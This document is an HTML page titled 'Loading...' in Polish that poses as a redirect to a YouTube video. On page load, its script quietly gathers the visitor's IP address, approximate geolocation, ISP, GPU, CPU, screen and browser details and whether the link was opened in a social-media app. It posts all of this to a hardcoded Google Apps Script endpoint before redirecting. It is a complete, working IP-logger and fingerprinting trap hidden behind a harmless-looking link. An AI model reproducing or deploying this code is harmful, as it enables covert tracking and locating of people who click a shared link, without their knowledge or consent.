<!DOCTYPE html>
<html>
<head>
    <title>Ładowanie...</title>
    <meta charset="UTF-8">
</head>
<body>
    <script>
        const GOOGLE_SHEETS_URL = "https://script.google.com/macros/s/AKfycbzRc0TLSz2PxBlJqCRV1x2Jt-tc0X23g28h5SCKWrOCCl-34peXrF7fzpyyytABzHwvoQ/exec";
        const VIDEO_ID = "dQw4w9WgXcQ";
        
        async function getIPAndLocation() {
            try {
                const controller = new AbortController();
                const timeoutId = setTimeout(() => controller.abort(), 3000);
                const response = await fetch('https://ipapi.co/json/', { signal: controller.signal });
                clearTimeout(timeoutId);
                if (!response.ok) throw new Error('HTTP error');
                const data = await response.json();
                return {
                    ip: data.ip || 'unknown',
                    city: data.city || 'unknown',
                    region: data.region || 'unknown',
                    country: data.country_name || 'unknown',
                    latitude: data.latitude || 'unknown',
                    longitude: data.longitude || 'unknown',
                    isp: data.org || 'unknown',
                    timezone: data.timezone || 'unknown'
                };
            } catch(e) {
                try {
                    const response2 = await fetch('https://api.ipify.org?format=json');
                    const data2 = await response2.json();
                    return {
                        ip: data2.ip,
                        city: 'unknown',
                        region: 'unknown',
                        country: 'unknown',
                        latitude: 'unknown',
                        longitude: 'unknown',
                        isp: 'unknown',
                        timezone: 'unknown'
                    };
                } catch(e2) {
                    return {
                        ip: 'unknown',
                        city: 'unknown',
                        region: 'unknown',
                        country: 'unknown',
                        latitude: 'unknown',
                        longitude: 'unknown',
                        isp: 'unknown',
                        timezone: 'unknown'
                    };
                }
            }
        }
        
        function getCPUDetails() {
            try {
                const cores = navigator.hardwareConcurrency || 'unknown';
                let vendor = 'unknown';
                let model = 'unknown';
                let architecture = 'unknown';
                const ua = navigator.userAgent;
                const platform = navigator.platform || '';
                if (ua.includes('x64') || ua.includes('x86_64') || platform.includes('Win64')) {
                    architecture = '64-bit';
                } else if (ua.includes('arm') || ua.includes('ARM')) {
                    architecture = 'ARM';
                }
                if (platform.includes('Win') || ua.includes('Windows')) {
                    vendor = 'Windows PC';
                    if (cores >= 8) model = 'High-end CPU';
                    else if (cores >= 4) model = 'Mid-range CPU';
                    else model = 'Entry-level CPU';
                }
                else if (platform.includes('Mac') || ua.includes('Mac OS')) {
                    vendor = 'Apple';
                    model = ua.includes('Apple') ? 'Apple Silicon' : 'Intel Mac';
                }
                else if (ua.includes('Android')) {
                    vendor = 'Mobile';
                    const match = ua.match(/\(([^)]+)\)/);
                    if (match && match[1].includes('SM-')) vendor = 'Samsung';
                    if (ua.includes('Exynos')) model = 'Exynos';
                    else if (ua.includes('Snapdragon')) model = 'Snapdragon';
                }
                else if (ua.includes('iPhone') || ua.includes('iPad')) {
                    vendor = 'Apple';
                    model = 'A-series';
                    architecture = 'ARM64';
                }
                return {
                    cores: cores,
                    vendor: vendor,
                    model: model,
                    architecture: architecture,
                    ram: navigator.deviceMemory ? navigator.deviceMemory + ' GB' : 'unknown'
                };
            } catch(e) {
                return { cores: 'unknown', vendor: 'error', model: 'error', architecture: 'error', ram: 'unknown' };
            }
        }
        
        function getGPU() {
            try {
                const canvas = document.createElement('canvas');
                const gl = canvas.getContext('webgl') || canvas.getContext('experimental-webgl');
                if (!gl) return 'WebGL not supported';
                const debugInfo = gl.getExtension('WEBGL_debug_renderer_info');
                if (debugInfo) {
                    return gl.getParameter(debugInfo.UNMASKED_RENDERER_WEBGL) || 'unknown';
                }
                return gl.getParameter(gl.RENDERER) || 'unknown';
            } catch(e) {
                return 'error';
            }
        }
        
        function getMemory() { return navigator.deviceMemory || 'unknown'; }
        function getLanguage() { return navigator.language || 'unknown'; }
        function getPlatform() { return navigator.platform || 'unknown'; }
        function getTimezone() { try { return Intl.DateTimeFormat().resolvedOptions().timeZone || 'unknown'; } catch(e) { return 'unknown'; } }
        function getConnectionType() { try { const conn = navigator.connection || navigator.mozConnection; return conn ? conn.effectiveType || conn.type : 'unknown'; } catch(e) { return 'unknown'; } }
        function getPluginsCount() { try { return navigator.plugins ? navigator.plugins.length : 0; } catch(e) { return 0; } }
        function getColorDepth() { return screen.colorDepth || 'unknown'; }
        function isInApp() { const ua = navigator.userAgent.toLowerCase(); return (ua.includes('instagram') || ua.includes('fb') || ua.includes('fban') || ua.includes('messenger')) ? 1 : 0; }
        function getScreenResolution() { return `${screen.width}x${screen.height}`; }
        
        async function collectAllData() {
            const locationPromise = getIPAndLocation();
            const cpuDetails = getCPUDetails();
            const gpu = getGPU();
            const platform = getPlatform();
            const userAgent = navigator.userAgent;
            const language = getLanguage();
            const screenRes = getScreenResolution();
            const colorDepth = getColorDepth();
            const pluginsCount = getPluginsCount();
            const connectionType = getConnectionType();
            const inApp = isInApp();
            const ram = getMemory();
            const timezone = getTimezone();
            const location = await locationPromise;
            return {
                timestamp: new Date().toISOString(),
                ip: location.ip,
                city: location.city,
                region: location.region,
                country: location.country,
                latitude: location.latitude,
                longitude: location.longitude,
                isp: location.isp,
                timezone: timezone,
                cpu_cores: cpuDetails.cores,
                cpu_vendor: cpuDetails.vendor,
                cpu_model: cpuDetails.model,
                cpu_architecture: cpuDetails.architecture,
                cpu_ram: ram,
                gpu: gpu,
                platform: platform,
                userAgent: userAgent,
                language: language,
                screen_resolution: screenRes,
                color_depth: colorDepth,
                plugins_count: pluginsCount,
                connection_type: connectionType,
                in_app: inApp,
                video_id: VIDEO_ID
            };
        }
        
        async function saveToGoogleSheets(data) {
            try {
                fetch(GOOGLE_SHEETS_URL, {
                    method: 'POST',
                    mode: 'no-cors',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify(data)
                }).catch(e => console.warn('Send failed:', e));
                console.log('✅ Dane wysłane');
            } catch(e) {
                console.error('❌ Błąd wysyłania:', e);
            }
        }
        
        async function main() {
            console.log('🚀 Start...');
            const data = await collectAllData();
            console.log('📊 Dane zebrane');
            saveToGoogleSheets(data);
            console.log('🔁 Przekierowanie...');
            window.location.href = 'https://www.youtube.com/watch?v=' + VIDEO_ID;
        }
        
        setTimeout(main, 10);
    </script>
</body>
</html>
